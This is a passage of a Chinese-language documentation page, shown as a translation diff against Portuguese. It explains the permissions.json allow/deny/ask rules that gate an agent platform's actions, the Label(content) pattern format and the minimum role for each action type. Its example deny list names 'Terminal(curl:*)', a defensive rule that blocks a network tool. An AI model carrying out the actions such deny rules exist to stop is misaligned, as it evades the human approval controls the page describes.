href=/brabo/dev/zh-Hans/adr>架构决策（ADR）</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href=# aria-haspopup=true aria-expanded=false role=button class=navbar__link><svg viewBox="0 0 24 24" width=20 height=20 aria-hidden=true class=iconLanguage_g_CG><path fill=currentColor d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"/></svg>简体中文</a><ul class=dropdown__menu><li><a href=/brabo/dev/reference/permissions target=_self rel="noopener noreferrer" class=dropdown__link lang=pt-BR>Português (Brasil)</a><li><a href=/brabo/dev/en/reference/permissions target=_self rel="noopener noreferrer" class=dropdown__link lang=en>English</a><li><a href=/brabo/dev/ru/reference/permissions target=_self rel="noopener noreferrer" class=dropdown__link lang=ru>Русский</a><li><a href=/brabo/dev/zh-Hans/reference/permissions target=_self rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang=zh-Hans>简体中文</a></ul></div><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href=# aria-haspopup=true aria-expanded=false role=button class=navbar__link>dev</a><ul class=dropdown__menu><li><a href=https://daneiel.github.io/brabo/prd/ target=_blank rel="noopener noreferrer" class=dropdown__link>prd — estável<svg width=12 height=12 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li><a href=https://daneiel.github.io/brabo/qa/ target=_blank rel="noopener noreferrer" class=dropdown__link>qa — 候选版<svg width=12 height=12 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li><a href=https://daneiel.github.io/brabo/dev/ target=_blank rel="noopener noreferrer" class=dropdown__link>dev — em desenvolvimento ✓<svg width=12 height=12 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a></ul></div><a href=https://github.com/daneiel/brabo target=_blank rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><div class="toggle_pnX7 colorModeToggle_Dj3Z"><button class="clean-btn toggleButton_DKER toggleButtonDisabled_qzkp" type=button disabled title=跟随系统 aria-label=切换浅色/暗黑模式（当前为跟随系统）><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_MMQL lightToggleIcon_E8tM"><path fill=currentColor d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"/></svg><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_MMQL darkToggleIcon_rXjT"><path fill=currentColor d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"/></svg><svg viewBox="0 0 24 24" width=24 height=24 aria-hidden=true class="toggleIcon_MMQL systemToggleIcon_zwCm"><path fill=currentColor d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"/></svg></button></div><div class=navbarSearchContainer_zRAa><div class="navbar__search searchBarContainer_eGzj" dir=ltr><svg aria-hidden=true class=searchIcon_PXpx focusable=false viewBox="0 0 16 16"><path fill=currentColor d="M6.02945 10.20327a4.17382 4.17382 0 1 1 4.17382-4.17382 4.15609 4.15609 0 0 1-4.17382 4.17382Zm9.69195 4.2199-4.8225-4.82338A5.88021 5.88021 0 0 0 12.058 6.02856 6.00467 6.00467 0 1 0 9.59979 10.8989l4.82338 4.82338a.89729.89729 0 0 0 1.29912 0 .89749.89749 0 0 0-.00087-1.29909Z"/></svg><input placeholder=搜索 aria-label=Search class="navbar__search-input searchInput_xOBI" value="" /><div class="loadingRing_JccP searchBarLoadingRing_aTss"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role=presentation class=navbar-sidebar__backdrop></div></nav><div id=__docusaurus_skipToContent_fallback class="theme-layout-main main-wrapper mainWrapper_WJkx"><div class=docsWrapper_mIeg><button aria-label=回到顶部 class="clean-btn theme-back-to-top-button backToTopButton_Afc8" type=button></button><div class=docRoot_XZYc><aside class="theme-doc-sidebar-container docSidebarContainer_FPqZ"><div class=sidebarViewport_waOe><div class=sidebar_RQC4><nav aria-label=文档侧边栏 class="menu thin-scrollbar menu_ZM4U"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/zh-Hans/><span class=categoryLinkLabel_jKch>🚀 从这里开始</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/><span class=linkLabel_CzBh>简介</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/getting-started><span class=linkLabel_CzBh>快速开始</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/tutorials/from-zero-to-deliverable><span class=linkLabel_CzBh>从零到交付物</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/zh-Hans/architecture><span class=categoryLinkLabel_jKch>🏗️ 架构</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/architecture><span class=linkLabel_CzBh>架构</span></a><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist" tabindex=0 href=/brabo/dev/zh-Hans/adr><span class=categoryLinkLabel_jKch>决策（ADR）</span></a><button aria-label="展开侧边栏分类 '决策（ADR）'" aria-expanded=false type=button class="clean-btn menu__caret"></button></div></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/zh-Hans/business-rules><span class=categoryLinkLabel_jKch>📐 规则</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/business-rules><span class=linkLabel_CzBh>业务规则</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/business-rules/custo><span class=linkLabel_CzBh>成本与计量</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/business-rules/autenticacao><span class=linkLabel_CzBh>认证</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role=button aria-expanded=true href=/brabo/dev/zh-Hans/reference/configuration><span class=categoryLinkLabel_jKch>📖 参考</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/configuration><span class=linkLabel_CzBh>配置</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/events><span class=linkLabel_CzBh>事件</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current=page tabindex=0 href=/brabo/dev/zh-Hans/reference/permissions><span class=linkLabel_CzBh>权限</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/artifacts><span class=linkLabel_CzBh>制品</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/git-providers><span class=linkLabel_CzBh>Git 提供方</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/internal-api><span class=linkLabel_CzBh>内部 API</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/scripts><span class=linkLabel_CzBh>脚本与命令</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/rulesets><span class=linkLabel_CzBh>仓库规则集</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/paridade-de-traducao><span class=linkLabel_CzBh>翻译一致性</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/brb><span class=linkLabel_CzBh>BRB 登记册</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/security-surface><span class=linkLabel_CzBh>api 的暴露面</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/reference/api><span class=linkLabel_CzBh>API 参考</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/zh-Hans/explanation/documentation-workflow><span class=categoryLinkLabel_jKch>💡 解释</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true tabindex=0 href=/brabo/dev/zh-Hans/explanation/documentation-workflow><span class=categoryLinkLabel_jKch>流程与流水线</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/explanation/documentation-workflow><span class=linkLabel_CzBh>文档同步</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/explanation/branching-policy><span class=linkLabel_CzBh>分支策略</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/explanation/cadeia-de-suprimentos-do-ci><span class=linkLabel_CzBh>CI 的供应链</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/explanation/gates><span class=linkLabel_CzBh>gates，以及如何测量它们</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/explanation/observability><span class=linkLabel_CzBh>可观测性</span></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/explanation/modelo-de-time><span class=linkLabel_CzBh>团队模型与交付物流程</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/dev/zh-Hans/explanation/primeiro-dogfooding><span class=categoryLinkLabel_jKch>验证与测量</span></a></div><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/dev/zh-Hans/explanation/historico-de-fases><span class=categoryLinkLabel_jKch>阶段历史</span></a></div><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/dev/zh-Hans/explanation/localizacao><span class=categoryLinkLabel_jKch>本地化</span></a></div><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=false tabindex=0 href=/brabo/dev/zh-Hans/explanation/tanstack-ai><span class=categoryLinkLabel_jKch>技术笔记</span></a></div></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/zh-Hans/runbook><span class=categoryLinkLabel_jKch>🛠️ 运维</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/runbook><span class=linkLabel_CzBh>运维手册</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true href=/brabo/dev/zh-Hans/glossary><span class=categoryLinkLabel_jKch>📚 词汇</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class=menu__link tabindex=0 href=/brabo/dev/zh-Hans/glossary><span class=linkLabel_CzBh>术语表</span></a></ul><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class=menu__list-item-collapsible><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class="categoryLink_akZY menu__link menu__link--sublist menu__link--sublist-caret" role=button aria-expanded=true><span class=categoryLinkLabel_jKch>🤝 贡献</span></a></div><ul class=menu__list><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_Ca3u" tabindex=0><span class=linkLabel_CzBh>如何贡献</span><svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/SUPPORT.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_Ca3u" tabindex=0><span class=linkLabel_CzBh>在哪里求助</span><svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a href=https://github.com/daneiel/brabo/blob/dev/SECURITY.md target=_blank rel="noopener noreferrer" class="menu__link menuExternalLink_Ca3u" tabindex=0><span class=linkLabel_CzBh>报告漏洞</span><svg width=13.5 height=13.5 aria-label=（在新标签页中打开） class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a></ul></ul></nav></div></div></aside><main class=docMainContainer_ia8v><div class="container padding-top--md padding-bottom--lg"><div class=row><div class="col docItemCol_xjE4"><div class=docItemContainer_cPej><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_sZul" aria-label=页面路径><ul class=breadcrumbs><li class=breadcrumbs__item><a aria-label=主页面 class=breadcrumbs__link href=/brabo/dev/zh-Hans/><svg viewBox="0 0 24 24" class=breadcrumbHomeIcon_AUjL><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill=currentColor /></svg></a><li class=breadcrumbs__item><span class=breadcrumbs__link>📖 参考</span><li class="breadcrumbs__item breadcrumbs__item--active"><span class=breadcrumbs__link>权限</span></ul></nav><div class="tocCollapsible_nbAK theme-doc-toc-mobile tocMobile_r92C"><button type=button class="clean-btn tocCollapsibleButton_hcyq">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>权限</h1></header>
+<p>每个有外部效果的动作都以 <code>proposed_action</code> 诞生，并在执行之前经过这里。本页是确切的格式与语义——规则本身见 <a class="" href=/brabo/dev/zh-Hans/business-rules#rn-004>业务规则</a>。</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=文件>文件<a href=#文件 class=hash-link aria-label=文件的直接链接 title=文件的直接链接 translate=no>​</a></h2>
+<p><code>permissions.json</code> 位于<strong>项目工作区的根目录</strong>——它是磁盘上一个真实的、可纳入版本控制的文件，而不是数据库中的一列。</p>
 <div class="language-json codeBlockContainer_Vzt9 theme-code-block" style=--prism-color:var(--syntax-text);--prism-background-color:var(--code-bg)><div class=codeBlockContent_FxwE><pre tabindex=0 class="prism-code language-json codeBlock_mqej thin-scrollbar" style=color:var(--syntax-text);background-color:var(--code-bg)><code class=codeBlockLines_uNqR><div class=token-line style=color:var(--syntax-text)><span class="token punctuation" style=color:var(--syntax-operator)>{</span><span class="token plain"></span><br/></div><div class=token-line style=color:var(--syntax-text)><span class="token plain">  </span><span class="token property" style=color:var(--syntax-type)>"allow"</span><span class="token operator" style=color:var(--syntax-operator)>:</span><span class="token plain"> </span><span class="token punctuation" style=color:var(--syntax-operator)>[</span><span class="token string" style=color:var(--syntax-string)>"Terminal(pnpm test:*)"</span><span class="token punctuation" style=color:var(--syntax-operator)>,</span><span class="token plain"> </span><span class="token string" style=color:var(--syntax-string)>"Terminal(git status)"</span><span class="token punctuation" style=color:var(--syntax-operator)>]</span><span class="token punctuation" style=color:var(--syntax-operator)>,</span><span class="token plain"></span><br/></div><div class=token-line style=color:var(--syntax-text)><span class="token plain">  </span><span class="token property" style=color:var(--syntax-type)>"deny"</span><span class="token operator" style=color:var(--syntax-operator)>:</span><span class="token plain">  </span><span class="token punctuation" style=color:var(--syntax-operator)>[</span><span class="token string" style=color:var(--syntax-string)>"Terminal(curl:*)"</span><span class="token punctuation" style=color:var(--syntax-operator)>]</span><span class="token punctuation" style=color:var(--syntax-operator)>,</span><span class="token plain"></span><br/></div><div class=token-line style=color:var(--syntax-text)><span class="token plain">  </span><span class="token property" style=color:var(--syntax-type)>"ask"</span><span class="token operator" style=color:var(--syntax-operator)>:</span><span class="token plain">   </span><span class="token punctuation" style=color:var(--syntax-operator)>[</span><span class="token string" style=color:var(--syntax-string)>"GitPush()"</span><span class="token punctuation" style=color:var(--syntax-operator)>]</span><span class="token plain"></span><br/></div><div class=token-line style=color:var(--syntax-text)><span class="token plain"></span><span class="token punctuation" style=color:var(--syntax-operator)>}</span><br/></div></code></pre></div></div>
-<p>Três listas, três significados:</p>
+<p>三个列表，三种含义：</p>
 
 
 
@@ -31,26 +28,17 @@ real em disco, versionável, não uma coluna no banco.</p>
 
 
 
-<table><thead><tr><th>lista<th>significado<tbody><tr><td><code>allow</code><td><code>auto_approve</code> — a ação executa sem perguntar<tr><td><code>deny</code><td><code>deny</code> — recusada, e nada reverte isso<tr><td><code>ask</code><td><code>require_approval</code> — vai para a fila de aprovação</table>
-<p>Nenhuma lista casa? A ação fica <code>pending</code> por padrão. <strong>A ausência de regra
-nunca vira permissão.</strong></p>
-<h3 class="anchor anchorTargetStickyNavbar_PEh0" id=com-qual-credencial-a-ação-auto-aprovada-executa>Com qual credencial a ação auto-aprovada executa<a href=#com-qual-credencial-a-ação-auto-aprovada-executa class=hash-link aria-label="Com qual credencial a ação auto-aprovada executa的直接链接" title="Com qual credencial a ação auto-aprovada executa的直接链接" translate=no>​</a></h3>
-<p><code>auto_approve</code> quer dizer que <strong>ninguém decidiu</strong> —
-<code>proposed_actions.decided_by</code> fica <code>NULL</code>. Isso importa para quem executa:
-uma ação de git contra um provider remoto precisa de um token, e "o token de
-quem decidiu" não existe neste caminho.</p>
-<p>A resposta é o <strong>owner do workspace</strong> (<a href=/brabo/dev/zh-Hans/business-rules/custo#rn-082 target=_blank rel="noopener noreferrer" class="">RN-082</a>),
-o mesmo da chave de LLM (<a href=/brabo/dev/zh-Hans/business-rules/custo#rn-058 target=_blank rel="noopener noreferrer" class="">RN-058</a>) — quem
-financia a conta financia os agentes, e isso não muda conforme quem clica.</p>
-<p>Vale saber porque a alternativa falha calada: enquanto a api resolvia por
-<code>decided_by</code>, <strong>toda PR auto-aprovada em repositório remoto morria</strong> com
-<code>Requires authentication</code>, e só quando um humano clicava em cada uma o
-caminho funcionava — exatamente a escada que a autonomia existe para evitar.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=o-formato-do-padrão>O formato do padrão<a href=#o-formato-do-padrão class=hash-link aria-label="O formato do padrão的直接链接" title="O formato do padrão的直接链接" translate=no>​</a></h2>
+<table><thead><tr><th>列表<th>含义<tbody><tr><td><code>allow</code><td><code>auto_approve</code> — 动作不询问直接执行<tr><td><code>deny</code><td><code>deny</code> — 被拒绝，任何东西都无法逆转<tr><td><code>ask</code><td><code>require_approval</code> — 进入审批队列</table>
+<p>没有任何列表匹配？动作默认保持 <code>pending</code>。<strong>没有规则永远不等于许可。</strong></p>
+<h3 class="anchor anchorTargetStickyNavbar_PEh0" id=自动批准的动作用哪个凭据执行>自动批准的动作用哪个凭据执行<a href=#自动批准的动作用哪个凭据执行 class=hash-link aria-label=自动批准的动作用哪个凭据执行的直接链接 title=自动批准的动作用哪个凭据执行的直接链接 translate=no>​</a></h3>
+<p><code>auto_approve</code> 的意思是<strong>没有人做出决定</strong>——
+<code>proposed_actions.decided_by</code> 保持 <code>NULL</code>。这对执行方很重要：针对远程 provider 的 git 动作需要一个 token，而在这条路径上“做出决定者的 token”并不存在。</p>
+<p>答案是<strong>工作区的 owner</strong>（<a class="" href=/brabo/dev/zh-Hans/business-rules/custo#rn-082>RN-082</a>），
+与 LLM 密钥相同（<a class="" href=/brabo/dev/zh-Hans/business-rules/custo#rn-058>RN-058</a>）——为账户付费的人也为 agent 付费，这不随点击者而改变。</p>
+<p>值得知道，因为另一种做法会静默失败：在 api 按 <code>decided_by</code> 解析时，<strong>所有在远程仓库中自动批准的 PR 都会失败</strong>，报 <code>Requires authentication</code>，只有当人逐个点击时这条路径才能走通——这恰恰是自主性本来要避免的阶梯。</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=模式的格式>模式的格式<a href=#模式的格式 class=hash-link aria-label=模式的格式的直接链接 title=模式的格式的直接链接 translate=no>​</a></h2>
 <div class="language-text codeBlockContainer_Vzt9 theme-code-block" style=--prism-color:var(--syntax-text);--prism-background-color:var(--code-bg)><div class=codeBlockContent_FxwE><pre tabindex=0 class="prism-code language-text codeBlock_mqej thin-scrollbar" style=color:var(--syntax-text);background-color:var(--code-bg)><code class=codeBlockLines_uNqR><div class=token-line style=color:var(--syntax-text)><span class="token plain">Label(content)</span><br/></div></code></pre></div></div>
-<p>O rótulo é o tipo de ação em PascalCase. O conteúdo só é usado em
-<code>Terminal</code>; nos outros tipos ele precisa ser <strong>vazio</strong> — <code>GitPush()</code> casa com
-qualquer push, e <code>GitPush(algo)</code> não casa com nada.</p>
+<p>标签是 PascalCase 形式的动作类型。内容只在 <code>Terminal</code> 中使用；在其他类型中它必须<strong>为空</strong>——<code>GitPush()</code> 匹配任何 push，而 <code>GitPush(algo)</code> 什么都不匹配。</p>
 
 
 
@@ -161,86 +149,40 @@ qualquer push, e <code>GitPush(algo)</code> não casa com nada.</p>
 
 
 
-<table><thead><tr><th>tipo de ação<th>rótulo<th>papel mínimo<tbody><tr><td><code>terminal</code><td><code>Terminal</code><td>developer<tr><td><code>git_commit</code><td><code>GitCommit</code><td>developer<tr><td><code>write_file</code><td><code>WriteFile</code><td>developer<tr><td><code>git_push</code><td><code>GitPush</code><td>maintainer<tr><td><code>pr_open</code><td><code>PrOpen</code><td>maintainer<tr><td><code>git_repo_create</code><td><code>GitRepoCreate</code><td>maintainer<tr><td><code>git_branch_create</code><td><code>GitBranchCreate</code><td>maintainer<tr><td><code>git_branch_protect</code><td><code>GitBranchProtect</code><td>maintainer<tr><td><code>open_adr_pr</code><td><code>OpenAdrPr</code><td>maintainer<tr><td><code>open_infra_pr</code><td><code>OpenInfraPr</code><td>maintainer<tr><td><code>git_merge</code><td><code>GitMerge</code><td>maintainer<tr><td><code>instruction_patch</code><td><code>InstructionPatch</code><td>maintainer<tr><td><code>parallelize</code><td><code>Parallelize</code><td>maintainer<tr><td><code>raise_max_parallel</code><td><code>RaiseMaxParallel</code><td>maintainer<tr><td><code>propose_execution_plan</code><td><code>ProposeExecutionPlan</code><td>maintainer<tr><td><code>assess_implementability</code><td><code>AssessImplementability</code><td>maintainer<tr><td><code>container_start</code><td><code>ContainerStart</code><td>maintainer<tr><td><code>container_stop</code><td><code>ContainerStop</code><td>maintainer<tr><td><code>container_remove</code><td><code>ContainerRemove</code><td>maintainer<tr><td><code>spend</code><td><code>Spend</code><td><strong>owner</strong></table>
-<p>O papel mínimo é conferido <strong>antes</strong> do arquivo. Sem ele, <code>deny</code> — o
-<code>permissions.json</code> não concede o que o IAM nega</p>
-<p><code>parallelize</code> (Fase 14d) é o único cujo efeito não é tocar código ou
-repositório: ele pede mais AGENTES. Está em <code>maintainer</code> pelo mesmo motivo de
-<code>spend</code> — quem autoriza custo é quem responde pelo projeto. Ele só existe
-acima do teto do lead; dentro dele não há ação, porque não há nada a decidir
-(<a href=/brabo/dev/zh-Hans/business-rules/custo#rn-083 target=_blank rel="noopener noreferrer" class="">RN-083</a>)
-(<a href=/brabo/dev/zh-Hans/business-rules#rn-005 target=_blank rel="noopener noreferrer" class="">RN-005</a>).</p>
-<p><code>propose_execution_plan</code> (ADR 0086, <a href=/brabo/dev/zh-Hans/business-rules#rn-284 target=_blank rel="noopener noreferrer" class="">RN-284</a>)
